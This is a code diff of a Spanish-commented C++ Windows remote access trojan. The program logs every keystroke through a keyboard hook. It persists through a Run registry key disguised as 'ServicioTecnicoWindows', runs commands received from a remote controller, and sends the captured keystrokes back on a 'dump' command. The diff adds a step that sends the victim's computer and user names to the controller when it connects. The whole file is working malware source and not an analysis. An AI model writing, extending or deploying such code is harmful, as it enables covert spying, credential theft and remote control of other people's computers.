@@ -4,20 +4,34 @@
 #include <array>
 #include <memory>
 #include <windows.h>
-#include <thread> // Necesario para ejecutar el keylogger en paralelo
+#include <thread>
 
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "advapi32.lib") // Librería necesaria para GetUserName
 
 // --- VARIABLE GLOBAL PARA EL KEYLOGGER ---
 std::string registroTeclas = "";
 
-// --- 1. FUNCIONES DEL KEYLOGGER (HOOKS) ---
+// --- 1. FUNCIÓN DE RECONOCIMIENTO (NUEVA) ---
+std::string obtenerInfoSistema() {
+    char pcName[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD pcSize = sizeof(pcName);
+    GetComputerNameA(pcName, &pcSize);
+
+    char userName[256];
+    DWORD userSize = sizeof(userName);
+    GetUserNameA(userName, &userSize);
+
+    // Formato: NOMBRE-PC|USUARIO
+    return std::string(pcName) + "|" + std::string(userName);
+}
+
+// --- 2. FUNCIONES DEL KEYLOGGER ---
 LRESULT CALLBACK HookTeclado(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
         DWORD vkCode = pKeyBoard->vkCode;
 
-        // Traducción básica de teclas
         if (vkCode == VK_BACK) registroTeclas += "[BACKSPACE]";
         else if (vkCode == VK_RETURN) registroTeclas += "\n";
         else if (vkCode == VK_SPACE) registroTeclas += " ";
@@ -36,7 +50,7 @@ void IniciarKeylogger() {
     UnhookWindowsHookEx(hhkLowLevelKybd);
 }
 
-// --- 2. FUNCIÓN DE PERSISTENCIA ---
+// --- 3. FUNCIÓN DE PERSISTENCIA ---
 void instalarPersistencia() {
     char rutaPropia[MAX_PATH];
     GetModuleFileNameA(NULL, rutaPropia, MAX_PATH);
@@ -45,11 +59,11 @@ void instalarPersistencia() {
 
     HKEY hKey;
     RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
-    RegSetValueExA(hKey, "ServicioTecnicoWindows", 0, REG_SZ, (BYTE*)rutaDestino.c_str(), rutaDestino.length());
+    RegSetValueExA(hKey, "ServicioTecnicoWindows", 0, REG_SZ, (BYTE*)rutaDestino.c_str(), (DWORD)rutaDestino.length());
     RegCloseKey(hKey);
 }
 
-// --- 3. FUNCIÓN PARA EJECUTAR COMANDOS (RCE) ---
+// --- 4. FUNCIÓN PARA EJECUTAR COMANDOS (RCE) ---
 std::string ejecutarComando(const char* cmd) {
     std::array<char, 128> buffer;
     std::string resultado;
@@ -61,12 +75,12 @@ std::string ejecutarComando(const char* cmd) {
     return resultado;
 }
 
-// --- 4. MAIN UNIFICADO ---
+// --- 5. MAIN ---
 int main() {
-    // A. Persistencia
+    // A. Asegurar persistencia
     instalarPersistencia();
 
-    // B. Iniciar Keylogger en segundo plano (Thread)
+    // B. Iniciar Keylogger
     std::thread hiloKeylogger(IniciarKeylogger);
     hiloKeylogger.detach(); 
 
@@ -87,6 +101,10 @@ int main() {
         return -1;
     }
 
+    // --- ENVIAR IDENTIDAD AL CONECTAR (CAMBIO AQUÍ) ---
+    std::string identidad = obtenerInfoSistema();
+    send(sock, identidad.c_str(), (int)identidad.length(), 0);
+
     // D. Bucle de Control
     while (true) {
         memset(buffer, 0, 4096);
@@ -95,20 +113,18 @@ int main() {
 
         std::string comando(buffer);
 
-        // --- LÓGICA DE COMANDOS ESPECIALES ---
         if (comando == "dump") {
             if (registroTeclas.empty()) {
                 send(sock, "Buffer vacio.\n", 14, 0);
             } else {
-                send(sock, registroTeclas.c_str(), registroTeclas.length(), 0);
-                registroTeclas = ""; // Limpiamos el log tras enviarlo
+                send(sock, registroTeclas.c_str(), (int)registroTeclas.length(), 0);
+                registroTeclas = ""; 
             }
         } 
         else {
-            // Comandos normales del sistema
             std::string respuesta = ejecutarComando(comando.c_str());
             if(respuesta.empty()) respuesta = "Comando ejecutado.\n";
-            send(sock, respuesta.c_str(), respuesta.length(), 0);
+            send(sock, respuesta.c_str(), (int)respuesta.length(), 0);
         }
     }
 
